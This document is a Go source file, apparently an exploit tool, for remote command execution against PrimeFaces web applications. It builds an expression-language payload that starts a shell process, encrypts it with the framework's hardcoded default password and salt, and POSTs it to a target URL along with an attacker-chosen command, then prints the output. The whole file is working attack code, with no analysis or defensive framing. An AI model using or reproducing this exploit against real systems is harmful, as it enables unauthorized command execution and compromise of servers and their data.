package exploit

import (
	"crypto/cipher"
	"crypto/des"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"io/ioutil"

	"github.com/fatih/color"
)

func _error(err interface{}) {

	if err != nil {
		log.Fatalln(err)
		os.Exit(0)
	}

}

func TargetConnect(TargetUrl string, Cmd string) {
	
	connectMsg := color.New(color.FgYellow).Add(color.Bold)
	statusCodeMsg := color.New(color.FgGreen).Add(color.Bold)

	connectMsg.Println("[!] Connecting to", TargetUrl)

	res, err := http.Get(TargetUrl)
	_error(err)

	statusCodeMsg.Println("[+] Got status code:", res.StatusCode)

	Exploit(TargetUrl, Cmd)

}

func getDerivedKey(password string, salt []byte, count int) ([]byte, []byte) {
	key := md5.Sum([]byte(password + string(salt)))
	for i := 0; i < count - 1; i++ {
		key = md5.Sum(key[:])
	}
	return key[:8], key[8:]
}

func Encrypt(password string, obtenationIterations int, plainText string, salt []byte) (string, error) {
	padNum := byte(8 - len(plainText) % 8)
	for i := byte(0); i < padNum; i++ {
		plainText += string(padNum)
	}

	dk, iv := getDerivedKey(password, salt, obtenationIterations)

	block,err := des.NewCipher(dk)

	if err != nil {
		return "", err
	}

	encrypter := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(plainText))
	encrypter.CryptBlocks(encrypted, []byte(plainText))

	return base64.StdEncoding.EncodeToString(encrypted), nil
}

func Exploit(TargetUrl string, Cmd string) {
	password := "primefaces"
	salt := []byte{0xA9, 0x9B, 0xC8, 0x32, 0x56, 0x34, 0xE3, 0x03} // \xA9\x9B\xC8\x32\x56\x34\xE3\x03
	iterations := 19

	full_payload := `${session.setAttribute("scriptfactory",facesContext.getExternalContext().getClass().getClassLoader().loadClass("javax.script.ScriptEngineManager").newInstance())}${session.setAttribute("scriptengine",session.getAttribute("scriptfactory").getEngineByName("JavaScript"))}${session.getAttribute("scriptengine").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}${session.getAttribute("scriptengine").eval("var os = java.lang.System.getProperty(\"os.name\");var proc = null;os.toLowerCase().contains(\"win\")? proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"cmd.exe\",\"/C\",\"".concat(request.getParameter("cmd")).concat("\"]).start() : proc = new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"").concat(request.getParameter("cmd")).concat("\"]).start();var is = proc.getInputStream();var sc = new java.util.Scanner(is,\"UTF-8\"); var out = \"\";while(sc.hasNext()) {out += sc.nextLine()+String.fromCharCode(10);}print(out);"))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()}`

	res, err := Encrypt(password, iterations, full_payload, salt)
	_error(err)

	payloadMsg := color.New(color.FgGreen).Add(color.Bold)
	payloadMsg.Println("[+] Encrypted Payload:", res)

	commandMsg := color.New(color.FgYellow).Add(color.Bold)
	commandMsg.Println("[*] Attemping to execute:", Cmd)

	hc := http.Client{}
	
	form := url.Values{}
	form.Add("pfdrt", "sc")
	form.Add("ln", "primefaces")
	form.Add("pfdrid", res)
	form.Add("cmd", Cmd)

	req, err := http.NewRequest("POST", TargetUrl, strings.NewReader(form.Encode()))

	req.PostForm = form
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err := hc.Do(req)
	_error(err)

	body, err := ioutil.ReadAll(resp.Body)
	_error(err)
	bodyResponse := string(body)

	fmt.Println("\n",bodyResponse)
	
}